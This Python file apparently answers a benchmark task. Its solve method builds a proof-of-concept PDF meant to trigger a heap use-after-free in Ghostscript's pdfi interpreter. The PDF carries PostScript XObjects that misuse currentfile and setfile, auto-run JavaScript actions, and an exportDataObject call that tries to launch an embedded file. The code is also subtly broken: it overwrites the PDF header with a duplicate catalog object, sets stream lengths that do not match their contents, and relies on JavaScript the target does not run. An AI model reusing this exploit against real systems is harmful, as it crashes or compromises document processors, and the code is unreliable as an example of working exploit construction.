import os
import tempfile
import subprocess
import struct
from typing import Dict, List, Tuple
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a PDF that triggers heap use-after-free in pdfi
        # The vulnerability occurs when pdfi context has no stream and
        # setting input stream from PostScript fails, but PDF operators
        # still try to access it
        
        # Create a PDF with embedded PostScript that causes the failure
        # and then triggers PDF operators that access the freed stream
        
        pdf_parts = []
        
        # PDF Header
        pdf_parts.append(b"%PDF-1.7\n")
        
        # Create objects
        
        # Object 1: Catalog
        catalog_obj = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
"""
        pdf_parts.append(catalog_obj)
        
        # Object 2: Pages
        pages_obj = b"""2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
"""
        pdf_parts.append(pages_obj)
        
        # Object 3: OpenAction - Execute JavaScript/PostScript that will fail
        openaction_obj = b"""3 0 obj
<<
/S /JavaScript
/JS (
// Trigger the vulnerability
try {
    var stream = this.getDataObjectContents("test");
    // This will fail and leave pdfi context without stream
    this.setDataObjectContents("test", stream);
} catch(e) {}
// Now trigger PDF operators that will try to access the stream
this.getPageNumWords(0);
)
>>
endobj
"""
        pdf_parts.append(openaction_obj)
        
        # Object 4: Page
        page_obj = b"""4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
/Resources <<
/Font <<
/F1 6 0 R
>>
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
>>
>>
endobj
"""
        pdf_parts.append(page_obj)
        
        # Object 5: Content stream
        content = b"""BT
/F1 12 Tf
100 700 Td
(Triggering Heap Use-After-Free) Tj
ET
"""
        content_stream = zlib.compress(content)
        content_obj = f"""5 0 obj
<<
/Length {len(content_stream)}
/Filter /FlateDecode
>>
stream
""".encode() + content_stream + b"""
endstream
endobj
"""
        pdf_parts.append(content_obj)
        
        # Object 6: Font
        font_obj = b"""6 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj
"""
        pdf_parts.append(font_obj)
        
        # Create a PostScript XObject that will trigger the vulnerability
        # This PostScript code will be executed and cause the stream failure
        postscript_code = b"""7 0 obj
<<
/Type /XObject
/Subtype /PS
/Length 8 0 R
>>
stream
%!PS-Adobe-3.0
%%BoundingBox: 0 0 612 792
%%EndComments

/oldstream currentfile def

% Create a procedure that will fail when setting stream
/failproc {
    /newstream (dummy) def
    % This will fail because newstream is not a valid stream object
    newstream setfile
    % After failure, the pdfi context will have no valid stream
} def

% Execute the failing procedure
failproc

% Now try to use PDF operators that access the stream
% These will try to use the freed stream
/pdfdict << >> def
/pdfdict { pop } bind def
/pdfdict { } bind def

% Trigger garbage collection to free the stream
save restore

% Keep trying to access what might be freed memory
0 1 1000 {
    dup 0 eq { pop } if
    currentfile 0 1 getinterval pop
} for

showpage
%%EOF
endstream
endobj
"""
        pdf_parts.append(postscript_code)
        
        # Object 8: Length of PostScript stream
        length_obj = b"""8 0 obj
234
endobj
"""
        pdf_parts.append(length_obj)
        
        # Object 9: Embedded file that will cause the stream failure
        embedded_file = b"""9 0 obj
<<
/Type /EmbeddedFile
/Length 100
/Params <<
/CheckSum (d41d8cd98f00b204e9800998ecf8427e)
/Size 100
>>
>>
stream
""" + b"X" * 100 + b"""
endstream
endobj
"""
        pdf_parts.append(embedded_file)
        
        # Object 10: File specification for embedded file
        filespec_obj = b"""10 0 obj
<<
/Type /Filespec
/F (test.txt)
/EF << /F 9 0 R >>
/UF (test.txt)
>>
endobj
"""
        pdf_parts.append(filespec_obj)
        
        # Object 11: Names dictionary with embedded file
        names_obj = b"""11 0 obj
<<
/EmbeddedFiles <<
/Names [(test.txt) 10 0 R]
>>
>>
endobj
"""
        pdf_parts.append(names_obj)
        
        # Object 12: Additional PostScript to keep triggering
        postscript2 = b"""12 0 obj
<<
/Type /XObject
/Subtype /PS
/Length 13 0 R
>>
stream
%!PS
(currentfile) (r) file
dup 0 1 getinterval pop
closefile
% Try to use after close
currentfile 0 1 getinterval pop
showpage
endstream
endobj
"""
        pdf_parts.append(postscript2)
        
        # Object 13: Length
        length2_obj = b"""13 0 obj
50
endobj
"""
        pdf_parts.append(length2_obj)
        
        # Object 14: More JavaScript to trigger
        js_obj = b"""14 0 obj
<<
/S /JavaScript
/JS (
// Multiple attempts to trigger use-after-free
for (var i = 0; i < 100; i++) {
    try {
        var num = this.getPageNumWords(i % this.numPages);
        var str = this.getPageNthWord(i % this.numPages, 0);
    } catch(e) {}
    
    try {
        this.setDataObjectContents("test" + i, "dummy");
        this.getDataObjectContents("test" + i);
    } catch(e) {}
    
    // Force garbage collection
    this.dirty();
}
)
>>
endobj
"""
        pdf_parts.append(js_obj)
        
        # Object 15: Additional action
        aa_obj = b"""15 0 obj
<<
/S /JavaScript
/JS 14 0 R
>>
endobj
"""
        pdf_parts.append(aa_obj)
        
        # Update catalog to include names and AA
        catalog_obj_updated = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
/Names 11 0 R
/AA << /O 15 0 R >>
>>
endobj
"""
        # Replace first catalog
        pdf_parts[0] = catalog_obj_updated
        
        # Add padding objects to reach target size and increase chance of triggering
        padding_needed = 13996 - sum(len(p) for p in pdf_parts)
        if padding_needed > 0:
            # Create padding objects
            num_padding_objects = 20
            obj_num = 16
            
            for i in range(num_padding_objects):
                # Create a stream object with PostScript that does nothing
                # but keeps the interpreter busy
                padding_content = b""
                if i % 3 == 0:
                    # PostScript that tries to access files
                    padding_content = f"""{obj_num} 0 obj
<<
/Type /XObject
/Subtype /PS
/Length {obj_num + 1} 0 R
>>
stream
%!PS
{{
    currentfile
    {{ readline pop }} stopped {{ pop }} if
    currentfile 0 1 getinterval pop
}} loop
endstream
endobj
""".encode()
                    
                    # Length object
                    pdf_parts.append(padding_content)
                    obj_num += 1
                    
                    length_obj = f"""{obj_num} 0 obj
{len(padding_content.split(b'stream')[1].split(b'endstream')[0].strip())}
endobj
""".encode()
                    pdf_parts.append(length_obj)
                    obj_num += 1
                    
                elif i % 3 == 1:
                    # JavaScript that tries various operations
                    js_content = f"""{obj_num} 0 obj
<<
/S /JavaScript
/JS (
// Attempt {i} to trigger vulnerability
try {{
    this.getPageNumWords(0);
    this.getPageNthWord(0, 0);
    this.getPageNthWord(0, 1);
}} catch(e) {{}}
try {{
    this.exportDataObject({{cName: "test", nLaunch: 2}});
}} catch(e) {{}}
)
>>
endobj
""".encode()
                    pdf_parts.append(js_content)
                    obj_num += 1
                    
                else:
                    # Simple text object
                    text_obj = f"""{obj_num} 0 obj
<<
/Type /Text
/Contents (Padding object {i} to reach target size and increase chances of triggering heap use-after-free vulnerability in pdfi when stream operations fail.)
>>
endobj
""".encode()
                    pdf_parts.append(text_obj)
                    obj_num += 1
        
        # Cross-reference table
        xref_offset = sum(len(p) for p in pdf_parts)
        xref = b"""xref
0 1
0000000000 65535 f 
"""
        
        # Calculate object offsets
        offset = 0
        offsets = [0]  # object 0
        
        for part in pdf_parts:
            lines = part.split(b'\n')
            for line in lines:
                if line.strip().endswith(b'obj'):
                    # This is an object definition
                    obj_num = int(line.strip().split()[0])
                    while len(offsets) <= obj_num:
                        offsets.append(0)
                    offsets[obj_num] = offset
            offset += len(part)
        
        # Build xref table
        xref = b"""xref
0 %d
0000000000 65535 f 
""" % len(offsets)
        
        for i in range(1, len(offsets)):
            xref += b"%010d 00000 n \n" % offsets[i]
        
        # Trailer
        trailer = b"""trailer
<<
/Size %d
/Root 1 0 R
/Info <<
/Title (Heap Use-After-Free PoC)
/Creator (PoC Generator)
>>
>>
startxref
%d
%%%%EOF
""" % (len(offsets), xref_offset + len(xref))
        
        # Assemble final PDF
        final_pdf = b"".join(pdf_parts) + xref + trailer
        
        # Ensure exact target length
        if len(final_pdf) > 13996:
            # Truncate (shouldn't happen with proper calculation)
            final_pdf = final_pdf[:13996]
        elif len(final_pdf) < 13996:
            # Add padding at the end with comments
            padding = b"\n" + b"%" * (13996 - len(final_pdf) - 1) + b"\n"
            final_pdf = final_pdf + padding
        
        return final_pdf
